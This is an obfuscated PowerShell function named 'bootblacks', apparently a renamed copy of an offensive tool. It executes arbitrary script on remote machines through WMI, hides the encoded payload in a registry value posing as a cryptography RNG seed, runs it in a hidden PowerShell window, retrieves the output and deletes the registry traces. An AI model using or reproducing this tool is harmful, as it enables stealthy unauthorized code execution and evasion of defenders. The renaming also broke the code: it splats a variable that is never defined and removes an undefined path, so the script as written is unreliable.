function bootblacks {


    [CmdletBinding()]
    Param (
        [Parameter( Mandatory = $True )]
        [ScriptBlock]
        $OnVxcvnOYdGIHyL,

        [String]
        [ValidateSet( 'HKEY_LOCAL_MACHINE',
                      'HKEY_CURRENT_USER',
                      'HKEY_CLASSES_ROOT',
                      'HKEY_USERS',
                      'HKEY_CURRENT_CONFIG' )]
        $U99GWhqqCwhiX9E = 'HKEY_CURRENT_USER',

        [String]
        [ValidateNotNullOrEmpty()]
        $XDJXXztrVqUXjhl = 'SOFTWARE\Microsoft\Cryptography\RNG',

        [String]
        [ValidateNotNullOrEmpty()]
        $ICIHCcJQhBfHMo9 = 'Seed',

        [String]
        [ValidateNotNullOrEmpty()]
        $lSWgtdStcMLaUHq = 'Value',

        [Parameter( ValueFromPipeline = $True )]
        [Alias('Cn')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $PhDSGUZCAMacS9l = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $bOo9UijDlqABKpS = [Management.Automation.PSCredential]::Empty,

        [Management.ImpersonationLevel]
        $i9SxbK9IWRz9piC,

        [System.Management.AuthenticationLevel]
        $PVW99LZtGzWSnfb,

        [Switch]
        $rUyT9zJdtdUUKeC,

        [String]
        $9urBuuabDiBRbTn
    )

    BEGIN {
        switch ($U99GWhqqCwhiX9E) {
            'HKEY_LOCAL_MACHINE' { $Hive = 2147483650 }
            'HKEY_CURRENT_USER' { $Hive = 2147483649 }
            'HKEY_CLASSES_ROOT' { $Hive = 2147483648 }
            'HKEY_USERS' { $Hive = 2147483651 }
            'HKEY_CURRENT_CONFIG' { $Hive = 2147483653 }
        }

        $E9TZpOJhjJ9n9va = 2147483650

        $xzvZ9jFKZElRqTM = @{}


        if ($PSBoundParameters['Credential']) { $xzvZ9jFKZElRqTM['Credential'] = $bOo9UijDlqABKpS }
        if ($PSBoundParameters['Impersonation']) { $xzvZ9jFKZElRqTM['Impersonation'] = $i9SxbK9IWRz9piC }
        if ($PSBoundParameters['Authentication']) { $xzvZ9jFKZElRqTM['Authentication'] = $PVW99LZtGzWSnfb }
        if ($PSBoundParameters['EnableAllPrivileges']) { $xzvZ9jFKZElRqTM['EnableAllPrivileges'] = $rUyT9zJdtdUUKeC }
        if ($PSBoundParameters['Authority']) { $xzvZ9jFKZElRqTM['Authority'] = $9urBuuabDiBRbTn }

        $p9zWULhG9DjVZLB = @{
            KEY_QUERY_VALUE = 1
            KEY_SET_VALUE = 2
            KEY_CREATE_SUB_KEY = 4
            KEY_CREATE = 32
            DELETE = 65536
        }


        $dAIV9FTJi9pOIBQ = $p9zWULhG9DjVZLB['KEY_QUERY_VALUE'] -bor
                               $p9zWULhG9DjVZLB['KEY_SET_VALUE'] -bor
                               $p9zWULhG9DjVZLB['KEY_CREATE_SUB_KEY'] -bor
                               $p9zWULhG9DjVZLB['KEY_CREATE'] -bor
                               $p9zWULhG9DjVZLB['DELETE']
    }

    PROCESS {
        foreach ($pjdIsuFNxWrOvJW in $PhDSGUZCAMacS9l) {

            $xzvZ9jFKZElRqTM['ComputerName'] = $pjdIsuFNxWrOvJW

            Write-Verbose "[$pjdIsuFNxWrOvJW] Creating the following registry key: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl"
            $pKbUMVkrtj9RLWA = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CreateKey' -ArgumentList $Hive, $XDJXXztrVqUXjhl

            if ($pKbUMVkrtj9RLWA.ReturnValue -ne 0) {
                throw "[$pjdIsuFNxWrOvJW] Unable to create the following registry key: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl"
            }

            Write-Verbose "[$pjdIsuFNxWrOvJW] Validating read/write/delete privileges for the following registry key: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl"
            $pKbUMVkrtj9RLWA = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'CheckAccess' -ArgumentList $Hive, $XDJXXztrVqUXjhl, $dAIV9FTJi9pOIBQ

            if (-not $pKbUMVkrtj9RLWA.bGranted) {
                throw "[$pjdIsuFNxWrOvJW] You do not have permission to perform all the registry operations necessary for bootblacks."
            }

            $TzPPLEQSIseUxpJ = 'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell'
            $hkOAB9UMIvVXZwq = 'Path'

            $pKbUMVkrtj9RLWA = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $E9TZpOJhjJ9n9va, $TzPPLEQSIseUxpJ, $hkOAB9UMIvVXZwq

            if ($pKbUMVkrtj9RLWA.ReturnValue -ne 0) {
                throw "[$pjdIsuFNxWrOvJW] Unable to obtain powershell.exe path from the following registry value: HKEY_LOCAL_MACHINE\$TzPPLEQSIseUxpJ\$hkOAB9UMIvVXZwq"
            }

            $xXYXngbScDnCVHb = $pKbUMVkrtj9RLWA.sValue
            Write-Verbose "[$pjdIsuFNxWrOvJW] Full PowerShell path: $xXYXngbScDnCVHb"

            $TiWUTBUltwkNLcM = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($OnVxcvnOYdGIHyL))

            Write-Verbose "[$pjdIsuFNxWrOvJW] Storing the payload into the following registry value: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl\$ICIHCcJQhBfHMo9"
            $pKbUMVkrtj9RLWA = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $Hive, $XDJXXztrVqUXjhl, $TiWUTBUltwkNLcM, $ICIHCcJQhBfHMo9

            if ($pKbUMVkrtj9RLWA.ReturnValue -ne 0) {
                throw "[$pjdIsuFNxWrOvJW] Unable to store the payload in the following registry value: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl\$ICIHCcJQhBfHMo9"
            }


            $kL9kPRPNTJ9KruB = @"
                `$Hive = '$Hive'
                `$XDJXXztrVqUXjhl = '$XDJXXztrVqUXjhl'
                `$ICIHCcJQhBfHMo9 = '$ICIHCcJQhBfHMo9'
                `$lSWgtdStcMLaUHq = '$lSWgtdStcMLaUHq'
                `n
"@

            $hvPOXS9Jqkcw9gT = $kL9kPRPNTJ9KruB + {
                $xzvZ9jFKZElRqTM = @{
                    Namespace = 'Root\default'
                    Class = 'StdRegProv'
                }

                $pKbUMVkrtj9RLWA = Invoke-WmiMethod @WmiMethodArgs -Name 'GetStringValue' -ArgumentList $Hive, $XDJXXztrVqUXjhl, $ICIHCcJQhBfHMo9

                if (($pKbUMVkrtj9RLWA.ReturnValue -eq 0) -and ($pKbUMVkrtj9RLWA.sValue)) {
                    $OnVxcvnOYdGIHyL = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($pKbUMVkrtj9RLWA.sValue))

                    $HoMVPPUvShC9wUx = [IO.Path]::GetTempFileName()

                    $HhRCsKPpCmEpEBo = Invoke-Expression ($OnVxcvnOYdGIHyL)

                    Export-Clixml -InputObject $HhRCsKPpCmEpEBo -Path $HoMVPPUvShC9wUx

                    $SNv9Q9NqecRheYG = [IO.File]::ReadAllText($HoMVPPUvShC9wUx)

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'SetStringValue' -ArgumentList $Hive, $XDJXXztrVqUXjhl, $SNv9Q9NqecRheYG, $lSWgtdStcMLaUHq

                    Remove-Item -Path $MnCt9GvLYeJPbDH -Force

                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'DeleteValue' -ArgumentList $Hive, $XDJXXztrVqUXjhl, $ICIHCcJQhBfHMo9
                }
            }

            $sWWvCHzjtmiIblI = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($hvPOXS9Jqkcw9gT))

            $99hAO9BNneqgFPI = "$xXYXngbScDnCVHb -WindowStyle Hidden -NoProfile -EncodedCommand $sWWvCHzjtmiIblI"


            $pKbUMVkrtj9RLWA = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\cimv2' -Class 'Win32_Process' -Name 'Create' -ArgumentList $99hAO9BNneqgFPI

            Start-Sleep -Seconds 5

            if ($pKbUMVkrtj9RLWA.ReturnValue -ne 0) {
                throw "[$pjdIsuFNxWrOvJW] Unable to execute payload stored within the following registry value: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl\$ICIHCcJQhBfHMo9"
            }

            Write-Verbose "[$pjdIsuFNxWrOvJW] Payload successfully executed from: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl\$ICIHCcJQhBfHMo9"

            $pKbUMVkrtj9RLWA = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $Hive, $XDJXXztrVqUXjhl, $lSWgtdStcMLaUHq

            if ($pKbUMVkrtj9RLWA.ReturnValue -ne 0) {
                throw "[$pjdIsuFNxWrOvJW] Unable retrieve the payload results from the following registry value: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl\$lSWgtdStcMLaUHq"
            }

            Write-Verbose "[$pjdIsuFNxWrOvJW] Payload results successfully retrieved from: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl\$lSWgtdStcMLaUHq"

            $MnCt9GvLYeJPbDH = $pKbUMVkrtj9RLWA.sValue

            $HoMVPPUvShC9wUx = [IO.Path]::GetTempFileName()

            Out-File -InputObject $MnCt9GvLYeJPbDH -FilePath $HoMVPPUvShC9wUx
            $HhRCsKPpCmEpEBo = Import-Clixml -Path $HoMVPPUvShC9wUx

            Remove-Item -Path $HoMVPPUvShC9wUx

            $tdarPyYXGUKsTlN = New-Object PSObject -Property @{
                PSComputerName = $pjdIsuFNxWrOvJW
                PayloadOutput = $HhRCsKPpCmEpEBo
            }

            Write-Verbose "[$pjdIsuFNxWrOvJW] Removing the following registry value: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl\$lSWgtdStcMLaUHq"
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteValue' -ArgumentList $Hive, $XDJXXztrVqUXjhl, $lSWgtdStcMLaUHq

            Write-Verbose "[$pjdIsuFNxWrOvJW] Removing the following registry key: $U99GWhqqCwhiX9E\$XDJXXztrVqUXjhl"
            $null = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'DeleteKey' -ArgumentList $Hive, $XDJXXztrVqUXjhl

            return $tdarPyYXGUKsTlN
        }
    }
}
